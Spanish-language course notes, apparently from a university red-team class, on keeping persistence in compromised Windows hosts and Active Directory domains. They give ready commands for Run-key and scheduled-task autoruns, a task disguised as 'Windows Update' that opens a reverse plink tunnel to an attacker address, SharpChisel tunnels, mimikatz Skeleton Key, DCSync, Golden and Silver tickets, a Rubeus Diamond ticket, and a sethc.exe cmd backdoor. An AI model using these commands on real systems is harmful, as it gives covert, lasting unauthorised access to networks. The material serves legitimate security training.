# 9. Despliegue de persistencia
## D1n0 - Alejandro Maman INSO3A U-TAD - 2025/2026

### Introducción
Desplegar persistencia lo antes posible para mantener acceso aunque se pierda el vector inicial. Existen múltiples capas:
- Sistemas internos
- Servidores en DMZ
- Dominio interno
- Cloud
- Vectores alternativos

### Stageless vs Staged
- **Stageless**: todo el payload está en el mismo binario (más simple, mayor tamaño)
- **Staged**: el payload inicial descarga el payload completo desde Internet (más discreto, requiere conectividad)

### Persistencia en sistemas (Windows)
Métodos de ejecución automática:
- **Registry Autoruns** (HKCU/HKLM)
- **Scheduled Tasks**
- **Startup Folder**

Aspectos importantes:
- Tener **múltiples persistencias** (en redes, usuarios, proxies y rutas diferentes)
- Binarios con nombre/fecha no llamativos
- Tiempo de conexión al VPS semi-aleatorio
- Usuarios de VPS sin shell, con certificado
- Solo usar una persistencia activa (las demás como backup)

**Registry Autorun:**
```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <nombre> /t REG_SZ /d "<binario>" /f
reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v <nombre>
```
Rutas disponibles: `Run`, `RunOnce` tanto en `HKCU` como en `HKLM`.

**Tarea programada:**
```cmd
schtasks /create /sc minute /mo <minutos> /tn "<nombre>" /tr "<comando>"
schtasks /create /ru "SYSTEM" /sc minute /mo 10 /tn "Windows Update" /tr "C:\temp\plink.exe 10.1.1.22 -P 443 -C -R 3445:127.0.0.1:445 -N -l root -pw kali batch"
```

**COM Hijacking:**
Identificar con Process Monitor objetos COM inexistentes pero llamados por procesos:
- Operaciones `RegOpenKey` con resultado `NAME NOT FOUND`
- Ruta que termine en `InprocServer32`

**SharpChisel-NG (tunelización + persistencia):**
```bash
# Servidor
./chisel server -p <puerto VPS> --keyfile "private" --auth "<user>:<pass>" -reverse --proxy "<URL redirección>"
```
```cmd
# Cliente (conexión inversa)
SharpChisel-ng.exe client --auth <user>:<pass> <URL> R:<puerto remoto>:<puerto local>

# Cliente como proxy SOCKS
SharpChisel-ng.exe client --auth <user>:<pass> <URL> R:<puerto VPS>:socks
```

### Persistencia en dominio (requiere privilegios elevados)
- **Persistencia básica**: modificar Attack Paths en BloodHound (GenericAll, WriteDACL, ResetPassword)
- **ACE**: habilitar permisos sobre grupos/usuarios admin
  ```powershell
  Add-DomainGroupMember -Identity "<grupo>" -Member <usuario> -Verbose
  ```
- **DCSync Backdoor**: conceder permisos "Replicating Directory Changes" a un usuario controlado
  ```cmd
  mimikatz# lsadump::dcsync /domain:<FQDN> /user:<usuario>
  ```
- **Skeleton Key**: hijacking de LSASS en el DC → cualquiera puede autenticarse con la clave `mimikatz`
  ```cmd
  mimikatz # misc::skeleton
  ```
- **Silver Ticket**: TGS firmado con clave de cuenta de máquina → acceso a cualquier usuario/servicio de esa máquina (~30 días de validez)
  ```cmd
  mimikatz # kerberos::golden /user:<usuario> /domain:<FQDN> /sid:<SID> /target:<máquina> /service:<servicio> /aes256:<clave AES256> /ticket:<output>
  ```
- **Golden Ticket**: TGT firmado con la clave de `krbtgt` → acceso a cualquier usuario, servicio y máquina del dominio (persistencia a largo plazo, clave nunca cambia automáticamente)
  ```cmd
  mimikatz # kerberos::golden /user:<usuario> /domain:<FQDN> /sid:<SID dominio> /aes256:<clave AES krbtgt> /ticket:golden.kirbi
  ```
- **Diamond Ticket**: modifica un TGT legítimo del DC para evitar detección (evita los indicadores del Golden Ticket)
  ```cmd
  rubeus.exe diamond /krbkey:<AES krbtgt> /user:<usuario> /password:<clave> /enctype:aes /ticketuser:<usuario a impersonar> /domain:<FQDN> /dc:<FQDN DC> /ticketuserid:<RID> /groups:<GID> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
  ```

### Persistencias alternativas
- reGeorg oculto en DMZ
- Punto de acceso Wi-Fi levantado desde el equipo comprometido
  ```cmd
  netsh wlan set hostednetwork mode=ALLOW ssid=<nombre> key=<clave> keyUsage=PERSISTENT
  netsh wlan start hostednetwork
  ```
- Forzar conexión del cliente a red del atacante:
  ```cmd
  netsh wlan connect ssid=<nombre> name=<nombre interfaz>
  ```
- Modificación de binarios accesibles sin sesión (para persistencia vía RDP):
  - **sethc.exe** (5x SHIFT): sustituir por cmd.exe
    ```cmd
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
    ```
  - Otros: `Utilman.exe` (Win+U), `Magnify.exe` (Win++/-), `Narrator.exe` (Win+Ctrl+N), `Atbroker.exe` (Win+X)
